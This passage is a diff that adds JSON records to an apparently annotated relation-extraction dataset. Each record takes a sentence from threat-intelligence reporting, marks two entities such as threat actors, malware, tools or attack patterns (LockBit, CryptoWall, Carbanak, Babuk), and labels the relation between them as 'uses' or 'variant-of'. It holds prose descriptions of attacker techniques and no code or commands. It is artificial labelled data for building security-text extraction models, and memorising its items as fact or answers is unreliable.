+    "tail_type":"identity",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"The [E1] campaign [\/E1] initially compromised e-commerce online shops in Japan, Australia, and European countries via [E2] spam emails [\/E2] with malicious attachments.",
+    "head_type":"campaign",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"[E1] Ghostwriter [\/E1] actors have quickly adopted this new technique, combining it with a previously observed technique, [E2] hosting credential phishing landing pages on compromised sites [\/E2].",
+    "head_type":"threat-actor",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"Both [E1] StealthMutant [\/E1] and StealthVector contain a payload of either the Cobalt Strike beacon or [E2] ScrambleCross [\/E2], a newly discovered backdoor.",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":" [E1] CVE-2022-22960 [\/E1] is a [E2] privilege escalation [\/E2] vulnerability in VMware Workspace ONE Access, Identity Manager and vRealize Automation instances, due to improper permissions in support scripts.",
+    "head_type":"vulnerability",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"A notable characteristic of [E1] Blackgear [\/E1] is the degree to which its attacks are taken to evade detection, [E2] abusing blogging, microblogging, and social media services [\/E2] to hide its command-and-control (C&C) configuration.",
+    "head_type":"threat-actor",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"Decompiled Form structure of [E1] Patchwork [\/E1]\u2019s sample (795ae4097aa3bd5932be4110f6bd992f46d605d4c9e3afced314454d35395a59, Detected as [E2] TROJ_DELF.XXWZ [\/E2])",
+    "head_type":"threat-actor",
+    "tail_type":"malware",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"The attacker holds the key necessary to decrypt the files unless the victim agrees to pay a $500 ransom.  Unlike previous versions of [E1] CryptoWall, 2.0 [\/E1] communicates with its command and control (C2) server through the [E2] Tor [\/E2] anonymization network.",
+    "head_type":"malware",
+    "tail_type":"tools",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":" Technically speaking, we have observed [E1] LockBit 2.0 [\/E1] affiliates leveraging the following tactics, techniques and procedures:  [E2] Windows SysInternals PsExec [\/E2] has been utilized for both persistence and execution purposes.",
+    "head_type":"threat-actor",
+    "tail_type":"tools",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"In both Carbanak and [E1] FIN7 [\/E1] attacks, communication with users\u2019 compromised systems is done through bypassing firewalls or network detection systems via commonly used ports, using connection proxies to avoid direct connections to the threat group\u2019s infrastructure, employing the command-and-control channel to remotely copy files from an external system, [E2] blending in with existing network traffic [\/E2] by using standard application layer protocol, and taking advantage of standard cryptographic protocol to disguise command-and-control traffic.",
+    "head_type":"threat-actor",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"Both [E1] StealthMutant [\/E1] and StealthVector contain a payload of either the [E2] Cobalt Strike [\/E2] beacon or ScrambleCross, a newly discovered backdoor.",
+    "head_type":"malware",
+    "tail_type":"tools",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"When it is loaded by the system, [E1] DLLMain  [\/E1]decrypts the payload via [E2] CryptUnprotectData [\/E2].",
+    "head_type":"malware",
+    "tail_type":"tools",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":" Credential theft today can happen in many ways, but the most notable are through credential phishing and the use of malware like [E2] keyloggers [\/E2] (both staples of the [E1] Sofacy group [\/E1]), as well as password reuse.",
+    "head_type":"threat-actor",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"I2P users can access specific I2P services that are only accessible on I2P, or access Internet resources without exposing their IP address.  In the case of [E1] CryptoWall 3.0 [\/E1], the malware is attempting to access multiple .i2p resources only accessible through [E2] I2P, [\/E2] also known as \u201ceepSites.\u201d  The CryptoWall 3.0 uses I2P in the same way CryptoWall 2.0 used Tor, to give victims access to a decrypting service to get their files back.",
+    "head_type":"malware",
+    "tail_type":"SOFTWARE",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"[E1] Carbanak [\/E1] also performs techniques for [E2] disabling security tools [\/E2], deleting files that are left in malicious activity, and modifying registry to hide configuration information.",
+    "head_type":"threat-actor",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"Leverage WMI for fileless intrusion Execute [E1] Powershell [\/E1] script for [E2] fileless intrusion [\/E2]",
+    "head_type":"tools",
+    "tail_type":"attack-pattern",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"While AvosLocker has been documented for its abuse of [E2] AnyDesk [\/E2] for [E1] lateral movement [\/E1] as its preferred application, we note that other remote access applications can also be abused to replace it.",
+    "head_type":"attack-pattern",
+    "tail_type":"tools",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":"While these connections allow us to link the malware to the [E1] Winnti Group [\/E1], the different targets between [E2] BIOPASS RAT [\/E2] and the current operations by Winnti\u2019s that we are tracking makes associating the two more difficult.",
+    "head_type":"threat-actor",
+    "tail_type":"malware",
+    "relation":"uses",
+    "label":23
+  },
+  {
+    "marked_text":" While there is a lot of overlap between [E1] HelloXD [\/E1] and [E2] Babuk [\/E2], there are some small but crucial differences to take note of between Babuk and the two different variants.  HelloXD version 1 is the least modified, utilizing Curve25519-Donna and a modified HC-128 algorithm to encrypt file data, while also containing the same CRC hashing routine incorporating the string dong, possibly referencing Chuong Dong, who had previously analyzed and reported on the first version of Babuk (Figure 8).",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"variant-of",
+    "label":24
+  },
+  {
+    "marked_text":" Of particular note is how these actors use a Remote Administration Tool (RAT) named [E1] NetWire [\/E1] (part of the [E2] NetWiredRC [\/E2] malware family).",
+    "head_type":"malware",
+    "tail_type":"malware",
+    "relation":"variant-of",
+    "label":24
+  }
+]
